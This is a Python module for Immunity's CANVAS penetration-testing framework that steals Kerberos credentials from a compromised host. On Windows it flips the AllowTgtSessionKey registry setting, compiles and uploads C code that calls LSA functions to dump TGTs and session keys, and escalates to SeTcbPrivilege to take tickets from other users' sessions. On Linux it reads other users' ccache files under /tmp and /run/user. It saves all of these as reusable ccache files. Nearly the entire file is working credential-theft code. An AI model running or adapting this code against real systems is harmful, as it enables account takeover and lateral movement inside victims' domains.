#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  kerberos_ticket_export.py
## Description:
##            :
## Created_On :  Fri Feb 20 2015
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random
from datetime import datetime, timedelta, tzinfo

if "." not in sys.path:
    sys.path.append(".")

from localNode import localNode
from engine.config import canvas_root_directory
from ExploitTypes.localcommand import LocalCommand
from win32MosdefShellServer import NameUserPrincipal, HKEY_LOCAL_MACHINE

# Kerberos stuff
from libs.kerberos.filetimes import filetime_to_dt, dt_to_filetime, utc
import libs.kerberos.ccache as cc
import libs.kerberos.protocol as krb

NAME                            = "Kerberos Ticket Export"
DESCRIPTION                     = "Export all the (potentially) available kerberos tickets on a given node"

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = """
This module aims at emulating the well known "klist.exe tgt" command on Windows.
The TGT once retrieved is written in a Unix ccache file in the "session" directory.

Note:
    1. The Windows part of the exploit does not support Windows 64 bits
    2. TGS extraction on Windows might be handled in the next version of the module.
    3. On Linux nodes this means the user is actually reading /tmp/krb5cc_%{uid}
       (Ubuntu), /run/user/%{uid}/%{random} (Fedora) or the file pointed by
       KRB5CCNAME. In the next version we will handle the case where we
       have read permissions (usually because we are root) on the ccache files
       of the other users.
    4. On Windows by default the TGT session key cannot always be exported. This
       can be solved easily by setting a specific registry key if the user has
       enough priviledges.
    5. On Windows a priviledged user (SYSTEM) is able to retrieve the tickets
       associated with all other sessions. If the node is running under administrator
       privileges, a priv esc has to be done before (such as migrating in to lsass.exe)
"""

VERSION             = "1.1"
PROPERTY            = {}
PROPERTY['TYPE']    = 'Commands'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ['Windows'], ["Linux"] ]
PROPERTY['VERSION'] = [ 'All' ]

# Keys used to enable TGT extraction
OLD_SUBKEY = "System\\CurrentControlSet\\Control\\Lsa\\Kerberos"
NEW_SUBKEY = "System\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters"

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        randint                  = random.randint(0, 5000)
        self.result              = ""
        self.name                = NAME
        self.lp64                = False
        self.local_path          = os.path.join(os.path.dirname(__file__), "sessions")
        self.session_ccache_file = os.path.join(self.local_path, 'ccache_%4.4d' % randint)
        if not os.path.exists(self.local_path):
            os.makedirs(self.local_path)
        self.old_key_exist       = 1
        self.new_key_exist       = 1
        self.old_value           = 0
        self.new_value           = 0
        return

    ###
    # Display the extracted tickets!
    ###

    def display_tickets(self, tickets, target, default_principal=None):
        nbr_tickets = len(tickets)
        log = 'Module results:\n'
        log += '\nTicket(s) extracted from node (%s): (%d)\n\n' % (target, nbr_tickets)
        for t in tickets:
            log += '\tDefault Principal: %s\n' % ( default_principal if default_principal else "???" )
            log += '\tServer: %s\n' % t['service']
            log += '\t\tTicketFlags: %x [ ' % t['ticketflags']
            if t['ticketflags'] & 0x40000000:
                log += 'FORWARDABLE:Yes, '
            else:
                log += 'FORWARDABLE:No, '
            if t['ticketflags'] & 0x00800000:
                log += 'RENEWABLE:Yes ]'
            else:
                log += 'RENEWABLE:No ]'
            log += '\n'
            log += '\t\tStart Time: %s\n' % t['StartTime']
            log += '\t\tEnd Time: %s\n' % t['EndTime']
            log += '\t\tRenew Time: %s\n\n' % t['RenewTime']
        self.log_info(log)

    ###
    # Windows specific API.
    ###

    def makecode_win32(self):
        # Remote imports may need to become local imports
        imports = """
            // remote
            #import "remote", "secur32.dll|LsaLookupAuthenticationPackage" as "LsaLookupAuthenticationPackage"
            #import "remote", "secur32.dll|LsaCallAuthenticationPackage" as "LsaCallAuthenticationPackage"
            #import "remote", "secur32.dll|LsaConnectUntrusted" as "LsaConnectUntrusted"
            #import "remote", "secur32.dll|LsaFreeReturnBuffer" as "LsaFreeReturnBuffer"
            #import "remote", "secur32.dll|LsaDeregisterLogonProcess" as "LsaDeregisterLogonProcess"
        """

        if self.lp64:
            imports = imports.replace("remote", "local")

        # Other local imports
        imports += """
            // local
            #import "local", "strlen" as "strlen"
            #import "local", "sendunistring2self" as "sendunistring2self"
            #import "local", "senddata2self" as "senddata2self"
            #import "local", "sendint" as "sendint"
            #import "local", "debug" as "debug"
            #import "local", "memcpy" as "memcpy"
            #import "local", "memset" as "memset"
        """

        if self.lp64:
            imports += """
            #import "local", "sendlonglong"    as "sendlonglong"
            """

        # Imports of user supplied strings/int/stuff
        imports += """
            // user supplied objects
            #import "int", "KERB_RETRIEVE_TKT_REQUEST_SIZE" as "KERB_RETRIEVE_TKT_REQUEST_SIZE"
            #import "int", "LowPart" as "LowPart"
            #import "int", "HighPart" as "HighPart"
        """

        # Macros
        macros = """
            // constants
            #define NULL 0
            #define KerbQueryTicketCacheMessage 1
            #define KerbRetrieveTicketMessage 4
            #define KerbRetrieveEncodedTicketMessage 8
            #define KERB_ETYPE_NULL 0
            #define KERB_RETRIEVE_TICKET_AS_KERB_CRED 8
        """

        # Structures 
        structures = """
            struct UNICODE_STRING {
                unsigned short Length;
                unsigned short MaximumLength;
                PADDING_ARCH
                short          *Buffer;
            };

            struct LSA_STRING {
                unsigned short Length;
                unsigned short MaximumLength;
                PADDING_ARCH
                char           *Buffer;
            };

            struct LUID {
                unsigned int LowPart;
                int          HighPart;
            };

            struct LARGE_INTEGER {
                unsigned int LowPart;
                int          HighPart;
            };

            struct SecHandle {
                unsigned long long dwLower;
                unsigned long long dwUpper;
            };

            struct KERB_CRYPTO_KEY {
                int           KeyType;
                unsigned int  Length;
                unsigned char *Value;
            };

            struct KERB_EXTERNAL_NAME {
                short                 NameType;
                unsigned short        NameCount;
                PADDING_ARCH
                struct UNICODE_STRING Names[1];
            };

            struct KERB_EXTERNAL_TICKET {
                struct KERB_EXTERNAL_NAME   *ServiceName;
                struct KERB_EXTERNAL_NAME   *TargetName;
                struct KERB_EXTERNAL_NAME   *ClientName;
                struct UNICODE_STRING       DomainName;
                struct UNICODE_STRING       TargetDomainName;
                struct UNICODE_STRING       AltTargetDomainName;
                struct KERB_CRYPTO_KEY      SessionKey;
                unsigned int                TicketFlags;
                unsigned int                Flags;
                struct LARGE_INTEGER        KeyExpirationTime;
                struct LARGE_INTEGER        StartTime;
                struct LARGE_INTEGER        EndTime;
                struct LARGE_INTEGER        RenewUntil;
                struct LARGE_INTEGER        TimeSkew;
                unsigned int                EncodedTicketSize;
                unsigned char               *EncodedTicket;
            };

            struct KERB_RETRIEVE_TKT_RESPONSE {
                struct KERB_EXTERNAL_TICKET Ticket;
            };

            struct KERB_RETRIEVE_TKT_REQUEST {
                int                        MessageType;
                struct LUID                LogonId;
                struct UNICODE_STRING      TargetName;
                unsigned int               TicketFlags;
                unsigned int               CacheOptions;
                int                        EncryptionType;
                struct SecHandle           CredentialsHandle;
            };
            """

        # NOW the code itself
        code_template = """
            void send_KEY(struct KERB_CRYPTO_KEY *k)
            {
                SENDLONG(k->KeyType);
                if(k->Value == NULL) {
                    senddata2self("", 0);
                } else {
                    senddata2self(k->Value, k->Length);
                }
                return;
            }

            void send_EXTERNAL_NAME(struct KERB_EXTERNAL_NAME *en)
            {
                struct UNICODE_STRING *pUnicode;
                ULONG i;
                ULONG NameCount;

                if(en == NULL) {
                    sendint(0);
                    return;
                }

                sendint(en);
                sendint(en->NameType);
                sendint(en->NameCount);

                i=0;
                NameCount = en->NameCount;
                pUnicode = en->Names;

                while( i < NameCount )
                {
                    senddata2self(pUnicode->Buffer, pUnicode->Length);
                    pUnicode = pUnicode + 1;
                    i = i + 1;
                }

                return;
            }

            void send_TGT(struct KERB_EXTERNAL_TICKET *ticket)
            {
                struct UNICODE_STRING *pUnicode;
                struct LARGE_INTEGER *Time;

                send_EXTERNAL_NAME(ticket->ServiceName);
                send_EXTERNAL_NAME(ticket->TargetName);
                send_EXTERNAL_NAME(ticket->ClientName);

                // Send DomainName
                pUnicode = ticket->DomainName;
                if(pUnicode->Buffer == NULL) {
                    senddata2self("", 0);
                } else {
                    senddata2self(pUnicode->Buffer, pUnicode->Length);
                }

                // Send TargetDomainName
                pUnicode = ticket->TargetDomainName;
                if(pUnicode->Buffer == NULL) {
                    senddata2self("", 0);
                } else {
                    senddata2self(pUnicode->Buffer, pUnicode->Length);
                }

                // Send AltTargetDomainName
                pUnicode = ticket->AltTargetDomainName;
                if(pUnicode->Buffer == NULL) {
                    senddata2self("", 0);
                } else {
                    senddata2self(pUnicode->Buffer, pUnicode->Length);
                }

                // Send the key
                send_KEY(ticket->SessionKey);

                // Flags
                SENDLONG(ticket->TicketFlags);
                SENDLONG(ticket->Flags);

                // Send KeyExpirationTime
                Time = ticket->KeyExpirationTime;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                // Send StartTime
                Time = ticket->KeyExpirationTime;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                // Send EndTime
                Time = ticket->EndTime;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                // Send RenewUntil
                Time = ticket->RenewUntil;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                // Send TimeSkew
                Time = ticket->TimeSkew;
                SENDLONG(Time->HighPart);
                SENDLONG(Time->LowPart);

                if(ticket->EncodedTicket == NULL) {
                    senddata2self("", 0);
                } else {
                    senddata2self(ticket->EncodedTicket, ticket->EncodedTicketSize);
                }

                return;
            }

            int __fetch_ticket(LONG LsaHandle, ULONG AuthenticationPackage, struct KERB_RETRIEVE_TKT_RESPONSE **pResponse)
            {
                LONG ntstatus;
                ULONG *Length;
                ULONG ProtocolStatus;
                struct KERB_RETRIEVE_TKT_REQUEST Request;
                struct LUID *L;

                Length = NULL;
                ProtocolStatus = 0;

                memset(&Request, 0, KERB_RETRIEVE_TKT_REQUEST_SIZE);
                Request.MessageType = KerbRetrieveTicketMessage;
                Request.EncryptionType = KERB_ETYPE_NULL;

                L = &Request.LogonId;
                L->LowPart = LowPart;
                L->HighPart = HighPart;

                ntstatus = LsaCallAuthenticationPackage(
                            LsaHandle,
                            AuthenticationPackage,
                            &Request,
                            KERB_RETRIEVE_TKT_REQUEST_SIZE,
                            pResponse,
                            &Length,
                            &ProtocolStatus);

                if (ntstatus < 0 ) {
                    sendint(-3);
                    SENDLONG(ntstatus);
                    return 0;
                }

                if (ProtocolStatus & 0x80000000) {
                    sendint(-4);
                    SENDLONG(ProtocolStatus);
                    return 0;
                }

                return 1;
            }

            int __LsaCallAuthenticationPackage_Tgt(long LsaHandle, unsigned long AuthenticationPackage)
            {
                struct KERB_RETRIEVE_TKT_RESPONSE *pResponse;
                int ret;

                pResponse = NULL;

                ret = __fetch_ticket(LsaHandle, AuthenticationPackage, &pResponse);
                if(ret == 0) {
                    if (pResponse)
                        LsaFreeReturnBuffer(pResponse);
                    return 0;
                }

                // At this point we succeeded

                sendint(1);
                SENDLONG(pResponse);
                if(pResponse)
                    send_TGT(pResponse);

                if (pResponse)
                    LsaFreeReturnBuffer(pResponse);

                return 1;
            }

            int __LsaLookupAuthenticationPackage(LONG *LsaHandle, ULONG *AuthenticationPackage)
            {
                LONG status;
                struct LSA_STRING PackageName;

                status = LsaConnectUntrusted(LsaHandle);
                if ( status < 0 ) {
                    sendint(-1);
                    SENDLONG(status);
                    return 0;
                }

                PackageName.Buffer = "Kerberos";
                PackageName.Length = 8;
                PackageName.MaximumLength = 9;

                status = LsaLookupAuthenticationPackage(*LsaHandle, &PackageName, AuthenticationPackage);

                if ( status < 0 ) {
                    sendint(-2);
                    SENDLONG(status);
                    return 0;
                }

                sendint(1);
                return 1;
            }


            void main(){

                LONG ret;
                LONG LsaHandle;
                ULONG AuthenticationPackage;

                ret = __LsaLookupAuthenticationPackage(&LsaHandle, &AuthenticationPackage);
                // If the function returned an error there is nothing we can do.
                if(ret == 0) {
                    return;
                }

                __LsaCallAuthenticationPackage_Tgt(LsaHandle, AuthenticationPackage);

                // Necessary to avoid rogue handles.
                if (LsaHandle)
                    LsaDeregisterLogonProcess(LsaHandle);

                return;
            }
        """

        if self.lp64:
            code_template = code_template.replace("ULONG", "unsigned long long")
            code_template = code_template.replace("SENDLONG", "sendlonglong")
            code_template = code_template.replace("LONG", "long long")
            structures    = structures.replace('PADDING_ARCH', 'unsigned int __paddingx64;')
        else:
            code_template = code_template.replace("ULONG", "unsigned long")
            code_template = code_template.replace("SENDLONG", "sendint")
            code_template = code_template.replace("LONG", "long")
            structures    = structures.replace('PADDING_ARCH', '')

        code = imports + macros + structures + code_template

        return code

    # Helper function to retrieve a specific value
    def _query_key_value(self, node, key):

        ret = node.shell.RegOpenKeyEx(HKEY_LOCAL_MACHINE, key, "KEY_READ")
        if ret < 0:
            return (ret, None)
        hkey = ret

        ret,datatype,data = node.shell.RegQueryValueEx(hkey, "AllowTgtSessionKey")
        node.shell.RegCloseKey(hkey)

        # Error is detected
        if not ret:
            return (data, None)
        else:
            return (0, data)

    # Helper function to set a specific value
    def _set_key_value(self, node, key, value):

        ret = node.shell.RegOpenKeyEx(HKEY_LOCAL_MACHINE, key, "KEY_WRITE")
        if ret < 0:
            return (ret, None)
        hkey = ret

        err = node.shell.RegSetValueEx(hkey, "AllowTgtSessionKey", "REG_DWORD", value)
        node.shell.RegCloseKey(hkey)

        # Error is detected
        if not err:
            return 0
        else:
            return err

    # This function modifies the registry but does it in a way
    # that can be reversed. We don't want to lower the security
    # of the owned node
    def enable_TGT_export(self, node):

        ERROR_FILE_NOT_FOUND = 2

        ret = self._query_key_value(node, OLD_SUBKEY)
        if ret[0] == ERROR_FILE_NOT_FOUND:
            self.old_key_exist = 0

        ret = self._query_key_value(node, NEW_SUBKEY)
        if ret[0] == ERROR_FILE_NOT_FOUND:
            self.new_key_exist = 0;

        if not self.old_key_exist and not self.new_key_exist:
            # We dont really care about the return as an error
            # is no problem anyway
            self._set_key_value(node, OLD_SUBKEY, 1)
            self._set_key_value(node, NEW_SUBKEY, 1)
            self.old_key_exist = 1
            self.new_key_exist = 1
            self.old_value = 0
            self.new_value = 1

        if not self.old_key_exist and self.new_key_exist:
            self._set_key_value(node, NEW_SUBKEY, 1)
        if self.old_key_exist and not self.new_key_exist:
            self._set_key_value(node, OLD_SUBKEY, 1)
        return

    # This function modifies the registry but does it in a way
    # that can be reversed. We don't want to lower the security
    # of the owned node
    def disable_TGT_export(self, node):

        if self.old_key_exist:
            self._set_key_value(node, OLD_SUBKEY, self.old_value)

        if self.new_key_exist:
            self._set_key_value(node, NEW_SUBKEY, self.new_value)

        return

    def readLONG(self, shell, signed=False):
        if self.lp64:
            return shell.readlonglong(signed)
        else:
            return shell.readint(signed)

    def readFileTime(self, shell):
        h = self.readLONG(shell)
        l = self.readLONG(shell)
        h = h & 0xffffffff
        l = l & 0xffffffff
        return (h<<32) | l

    def readExternalName(self, shell):
        en = {}
        ptr = shell.readint()
        if not ptr:
            en['type'] = 0
            en['name'] = ''
            return en

        _type = shell.readint()
        count = shell.readint()
        en['type'] = _type
        L = []
        for i in xrange(count):
            L.append(shell.readblock().decode('utf-16le'))
        en['name'] = L
        return en

    def readKey(self, shell):
        key = []
        key.append(int(self.readLONG(shell)))
        key.append(str(shell.readblock()))
        return key

    def filetime_to_timestamp(self, ft_dec):
        if ft_dec == 0:
            return 0
        EPOCH_AS_FILETIME = 116444736000000000
        HUNDREDS_OF_NANOSECONDS = 10000000
        dt = datetime.fromtimestamp((ft_dec - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS)
        timestamp = time.mktime(dt.timetuple())
        return int(timestamp)

    def generate_ccache_filename(self, target):
        randint = random.randint(0, 5000)
        s = 'ccache_%s_%.4d.txt' % (target, randint)
        self.session_ccache_file = os.path.join(self.local_path, s)

    def do_recv_and_write_tgt_windows(self,node):
        # First step is to actually fetch the TGT.
        # This step should not fail unless mosdef-c is not correct.

        shell=node.shell
        try:
            servicename = self.readExternalName(shell)
            targetname = self.readExternalName(shell)
            clientname = self.readExternalName(shell)
            domainname = shell.readblock().decode('utf-16le').encode('ASCII')
            targetdomainname = shell.readblock().decode('utf-16le').encode('ASCII')
            alttargetdomainname = shell.readblock().decode('utf-16le').encode('ASCII')
            key = self.readKey(shell)
            ticketflags = self.readLONG(shell)
            flags = self.readLONG(shell)
            keyexpirationtime = self.readFileTime(shell)
            starttime = self.readFileTime(shell)
            endtime = self.readFileTime(shell)
            renewtime = self.readFileTime(shell)
            timeskew = self.readFileTime(shell)
            ticket_str = shell.readblock()
        except Exception as e:
            self.log_error('Error while receiving data from mosdef: %s' % str(e))
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        # Then we release the callback anyway because we don't want to lose it.
        self.log_info('Unlocking the callback')
        shell.leave()

        # If the session key is empty, the ticket can't be used anyway
        if not len(key[1]):
            self.log_error('Unfortunately the session key could not be exported, saving the TGT would be pointless')
            return None

        # We prepare the metadata to print its description in the logs
        ticket = {}
        ticket['service'] = "%s@%s" % ("/".join(servicename['name']),domainname)
        ticket['ticketflags'] = ticketflags
        starttime_tms = self.filetime_to_timestamp(starttime)
        endtime_tms = self.filetime_to_timestamp(endtime)
        renewtime_tms = self.filetime_to_timestamp(renewtime)
        keyexpirationtime_tms = self.filetime_to_timestamp(keyexpirationtime)
        if starttime_tms:
            ticket['StartTime'] = time.ctime(starttime_tms)
        else:
            ticket['StartTime'] = '(empty)'
        if endtime_tms:
            ticket['EndTime'] = time.ctime(endtime_tms)
        else:
            ticket['EndTime'] = '(empty)'
        if renewtime_tms:
            ticket['RenewTime'] = time.ctime(renewtime_tms)
        else:
            ticket['RenewTime'] = '(empty)'

        # We can now write the ccache file
        client_principal = krb.Convert2PrincipalType(clientname['name'][0].encode('ASCII').lower(), domainname)
        auth_principal = krb.Convert2ServiceAndInstanceType('krbtgt/'+domainname, domainname)
        session_key2 = key
        times2 = [ keyexpirationtime_tms, starttime_tms, endtime_tms, renewtime_tms ]
        self.generate_ccache_filename(self.get_target_ips_str(node, "_"))
        self.nlog('Saving TGT in %s' % self.session_ccache_file)
        try:
            cc1 = cc.CCache()
            cc1.open(self.session_ccache_file, new=1)
            cc1.set_header(client_principal, domainname)
            cc1.import_creds(client_principal,
                             auth_principal,
                             session_key2,
                             times2,
                             tktflags=ticketflags,
                             is_skey=0,
                             ticket=ticket_str,
                             cut=0)
            cc1.write()
        except Exception as e:
            self.log_error('Unexpected error: %s'%str(e))
            return None
        else:
            # At this point we have a correct ccache file saved in ./session/
            return [ ticket ]

    def do_exploit_windows(self, node, luid):
        shell = node.shell

        lvars = {
            'KERB_RETRIEVE_TKT_REQUEST_SIZE':40, # TODO 64 bits
            'LowPart': luid[0],
            'HighPart': luid[1],
        }

        self.nlog('Preparing the C code')
        code = self.makecode_win32()
        shell.clearfunctioncache()
        try:
            self.nlog('Compiling the code')
            request = shell.compile(code, lvars)
        except Exception as e:
            self.log_error(str(e))
            return None
        # print code, lvars, request
        self.nlog('Uploading the code...')
        shell.sendrequest(request)

        # __LsaLookupAuthenticationPackage
        ret1 = shell.readint(signed=True)

        if ret1 == -1:
            ntstatus = self.readLONG(shell)
            self.log_error('LsaConnectUntrusted() failed with ntstatus %x' % ntstatus)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        if ret1 == -2:
            ntstatus = self.readLONG(shell)
            self.log_error('LsaLookupAuthenticationPackage() failed with ntstatus %x' % ntstatus)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        self.log_info('LsaLookupAuthenticationPackage() called successfully')

        # __LsaCallAuthenticationPackage_Tgt
        ret2 = shell.readint(signed=True)

        if ret2 == -3:
            ntstatus = self.readLONG(shell)
            self.log_error('LsaCallAuthenticationPackage() failed with ntstatus %x' % ntstatus)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        if ret2 == -4:
            protocol_status = self.readLONG(shell)
            self.log_error('LsaCallAuthenticationPackage() failed with ntstatus = 0 and protocol_status = %x' % protocol_status)
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        self.log_info('LsaCallAuthenticationPackage() called successfully')

        ptr = self.readLONG(shell)
        if not ptr:
            # This should not happen according to the API. However we're never
            # too careful.
            self.log_error('LsaCallAuthenticationPackage() returned an empty pointer.')
            self.log_info('Unlocking the callback')
            shell.leave()
            return None

        return self.do_recv_and_write_tgt_windows(node)

    ###
    # UNIX specific API
    ###

    def extract_client_principal(self, unix_ccache_file):
        cc1 = cc.CCache()
        cc1.open(unix_ccache_file, new=0)
        return cc1.get_primary_principal()

    def extract_unix_ticket_meta(self, unix_ccache_file):
        cc1 = cc.CCache()
        cc1.open(unix_ccache_file, new=0)
        creds = cc1.get_credentials()
        tickets = []
        for cred in creds:
            # We do not include in the display the configuration stored in
            # the ccache file.
            if cred.is_config_credential():
                continue
            ticket = {}
            service = cred.get_service_principal()
            client = cred.get_client_principal()
            flags = cred.get_flags()
            times = cred.get_times()
            ticket['service'] = "%s@%s" % (service[0],service[2])
            ticket['ticketflags'] = flags
            if times[0]:
                ticket['StartTime'] = time.ctime(times[0])
            else:
                ticket['StartTime'] = '(empty)'
            if times[2]:
                ticket['EndTime'] = time.ctime(times[2])
            else:
                ticket['EndTime'] = '(empty)'
            if times[3]:
                ticket['RenewTime'] = time.ctime(times[3])
            else:
                ticket['RenewTime'] = '(empty)'
            tickets.append(ticket)
        return tickets

    def makecode_unix(self):
        code = """
            // remote
            #import "REMOTE", "getenv" as "getenv"

            // local
            #import "local", "sendint" as "sendint"
            #import "local", "sendstring" as "sendstring"

            void main(){
                char *p;

                p = getenv("KRB5CCNAME");
                if(p) {
                    sendint(1);
                    sendstring(p);
                    return;
                }
                sendint(0);
                return;
            }
        """

        if self.lp64:
            code = code.replace("REMOTE", "local")
        else:
            code = code.replace("REMOTE", "remote")
        return code

    def do_fetch_ENV_ccache(self, node):

        shell = node.shell
        tickets = []
        self.nlog('Preparing the Unix C code to fetch $KRB5CCNAME')
        code = self.makecode_unix()
        shell.clearfunctioncache()
        try:
            self.nlog('Compiling the code')
            request = shell.compile(code, {})
        except Exception as e:
            self.log_error(str(e))
            return tickets

        self.nlog('Uploading the code...')
        shell.sendrequest(request)

        # So was the payload successful?
        res = shell.readint()
        if not res:
            self.nlog("$KRB5CCNAME is not set in this context")
            self.log_info('Unlocking the callback')
            shell.leave()
            return tickets

        fname = shell.readstring()
        self.nlog("$KRB5CCNAME is set to %s" % fname)
        self.log_info('Unlocking the callback')
        shell.leave()

        ret, stat = shell.stat(fname)
        if ret:
            self.log_error('%s does not exist...' % fname)
            return tickets

        file_size = stat['st_size']
        fd = shell.open(fname, node.shell.libc.getdefine('O_RDONLY'))
        if fd < -1:
            self.log_error('Cannot open the file %s' % fname)
            return tickets

        ret, ccache_content = shell.read(fd, file_size)
        shell.close(fd)
        if not ret or not ccache_content:
            return tickets

        self.nlog('Found potential credentials in %s' % fname)
        tickets.append((shell.getuid(), ccache_content))
        return tickets

    # Handles FEDORA
    def do_fetch_FEDORA_ccache(self, node, uid=0):

        shell = node.shell
        tickets = []

        # First of all, let's get the directory listing
        file_list = shell.dodir("/run/user/")
        if not file_list:
            return tickets

        # For each file we try to extract the credentials, no matter what.
        # If we are lucky (EUID==0 or privileges problem) we may fetch some.
        for fname,fstat in file_list:
            if fname != '.' and fname != '..':

                uid = fname
                if not uid.isdigit():
                    continue

                # OK does the file exist and can we read it?
                index_file = "/run/user/%s/krb5cc/primary" % fname
                ret, stat = shell.stat(index_file)
                if ret:
                    continue

                file_size = stat['st_size']
                fd = shell.open(index_file, node.shell.libc.getdefine('O_RDONLY'))
                if fd < -1:
                    continue

                ret, ccache_file = shell.read(fd, file_size)
                shell.close(fd)
                if not ret or not ccache_file:
                    continue

                ccache_file = '/run/user/%s/krb5cc/%s' % (fname, ccache_file.strip())
                ret, stat = shell.stat(ccache_file)
                if ret:
                    continue

                file_size = stat['st_size']
                fd = shell.open(ccache_file, node.shell.libc.getdefine('O_RDONLY'))
                if fd < -1:
                    continue

                ret, ccache_content = shell.read(fd, file_size)
                shell.close(fd)
                if not ret or not ccache_content:
                    continue

                self.nlog('Found potential credentials in %s' % ccache_file)
                tickets.append((uid, ccache_content))

        return tickets

    # Handles Ubuntu, Debian, FreeBSD, CentOS
    def do_fetch_UBUNTU_ccache(self, node, uid=0):

        shell = node.shell
        tickets = []

        # First of all, let's get the directory listing
        file_list = shell.dodir("/tmp")
        if not file_list:
            return tickets

        # For each file we try to extract the credentials, no matter what.
        # If we are lucky (EUID==0 or privileges problem) we may fetch some.
        for fname,fstat in file_list:
            if fname != '.' and fname != '..' and fname.startswith('krb5cc_'):

                uid = fname[len('krb5cc_'):]

                if not uid.isdigit():
                    continue

                # OK does the file exist and can we read it?
                fname = '/tmp/' + fname
                ret, stat = shell.stat(fname)
                if ret:
                    continue

                file_size = stat['st_size']
                fd = shell.open(fname, node.shell.libc.getdefine('O_RDONLY'))
                if fd < -1:
                    continue

                ret, ccache_content = shell.read(fd, file_size)
                shell.close(fd)
                if not ret or not ccache_content:
                    continue

                self.nlog('Found potential credentials in %s' % fname)
                tickets.append((uid, ccache_content))

        return tickets

    def do_exploit_unix(self, node):

        shell = node.shell
        uname_str = shell.uname()
        if uname_str:
            self.nlog('Attacking %s %s' % (uname_str['sysname'], uname_str['release']))

        # First of all, let's get the uid
        uid = shell.getuid()
        if not uid:
            self.nlog('Node is running under privileged process (UID=%d)' % uid)
        else:
            self.nlog('Node is running under unprivileged process (UID=%d)' % uid)

        # Of the form [ { 'uid', ccache_file }, ... ]
        tickets = []
        tickets += self.do_fetch_ENV_ccache(node)
        tickets += self.do_fetch_FEDORA_ccache(node, uid)
        tickets += self.do_fetch_UBUNTU_ccache(node, uid)

        from collections import OrderedDict
        tickets2 = list(OrderedDict.fromkeys(tickets))

        # It's time to save the tickets in files.
        for i in xrange(len(tickets2)):
            uid,data = tickets2[i]
            session_ccache_file = self.session_ccache_file + '_%d_uid_%s' % (i,uid)
            self.nlog('Saving ticket in %s' % session_ccache_file)
            try:
                f = open(session_ccache_file, 'wb')
                f.write(data)
                f.close()
            except Exception as e:
                self.log_error('Unexpected error: %s'%str(e))
                return self.fail()
            else:
                # At this point we have a correct ccache file saved in ./tmp/
                # We may parse it using the CCACHE API.
                tickets_meta_data = self.extract_unix_ticket_meta(session_ccache_file)
                primary_principal = self.extract_client_principal(session_ccache_file)
                self.display_tickets(tickets_meta_data, self.get_target_ips_str(node, ", "), primary_principal)
        return self.success()

    def success(self):
        self.setInfo("%s - done (success: %s)" % (NAME,self.result))
        return 1

    def fail(self):
        self.setInfo('%s - done (ERROR)' % NAME)
        return 0

    def getargs(self):
        pass

    def is_64bit_node(self, node):
        if "win32api" in node.capabilities:
            if node.nodetype == "win64Node":
                return True
            else:
                return False
        if "Unix Shell" in node.capabilities:
            if hasattr(node.shell, "LP64"):
                return node.shell.LP64
            else:
                return False
        return False

    def get_target_ips_str(self, node, separator):
        target_ips = node.getallips()
        # 127.0.0.1
        if len(target_ips) == 1:
            return target_ips[0]
        else:
            try:
                target_ips.remove('127.0.0.1')
            except Exception as e:
                pass
            return separator.join(target_ips)

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        node     = self.argsDict["passednodes"][0]
        _type    = node.nodetype
        nodename = node.getname()

        if isinstance(node, localNode):
            self.log_error('Node of type %s not supported' % _type)
            return self.fail()

        if not node.shell:
            self.log_error("Node doesn't have a shell")
            return self.fail()

        if self.is_64bit_node(node):
            self.lp64 = True
        #     self.log_error('x64 version is not ready yet.')
        #     return self.fail()

        if "Unix Shell" in node.capabilities:
            if self.lp64:
                self.log_error('x64 version is not ready yet.')
                return self.fail()
            else:
                return self.do_exploit_unix(node)
        elif "win32api" in node.capabilities:
            # This function may fail, we don't care
            ret, nodeos = node.shell.GetVersionEx()
            if ret:
                minor = nodeos['Minor Version']
                major = nodeos['Major Version']
                self.nlog('Attacking Windows %d.%d' % (major, minor))

            # Let's enable the registry if we need to.
            self.enable_TGT_export(node)

            current_principal = node.shell.whoami(name_format=NameUserPrincipal)
            if not current_principal or not '@' in current_principal:
                self.log_info("This host doesn't seem to be part of a domain.")
                domain_fqdn = '<unknown>'
            else:
                domain_fqdn = current_principal.split('@')[1]

            ip_str = self.get_target_ips_str(node, ", ")

            # First of all, we want to retrieve information related to the current
            # session
            info = []
            tickets = self.do_exploit_windows(node, [0,0])
            if tickets:
                info.append((current_principal, tickets))

            # Then let's try to see if we can get the SeTcbPrivilege
            # privilege. If we can, then it means that we are able to impersonate.
            # This gives us the uncanny ability to retrieve informations related to
            # other sessions.
            ret = self.exploitnodes("getpriv", [node], {"privname":"SeTcbPrivilege"})
            if ret[0]:
                self.log_info("Token SeTcbPrivilege was acquired")
                ret, sessions = node.shell.EnumSessions()
                # This should not happen unless there is a major bug in our mosdef code
                if ret or not len(sessions):
                    self.log_error("EnumSessions() failed: spying other sessions is unavailable")
                else:
                    # We can now spy the other sessions
                    for session in sessions:
                        if session['auth_type'] == 'Kerberos':
                            principal = '%s@%s' % (session['username'], domain_fqdn)
                            tickets = self.do_exploit_windows(node, session['logonid'])
                            if tickets:
                                info.append((principal, tickets))
            else:
                self.log_info("Token SeTcbPrivilege could not be acquired")
                self.log_info("If you have administrator privileges, please run the module using SYSTEM privileges")

            self.disable_TGT_export(node)

            # When everything is over, there is nothing left but to print the
            # result of our investigation.
            if not info:
                self.log_info("No tickets found.")
            else:
                for principal, tickets in info:
                    self.display_tickets(tickets, ip_str, principal)
            return self.success()
        else:
            self.log_error("Node of type %s not supported yet" % _type)
            return self.fail()


if __name__=="__main__":
    print "This is an exploit that should be used only from within CANVAS"
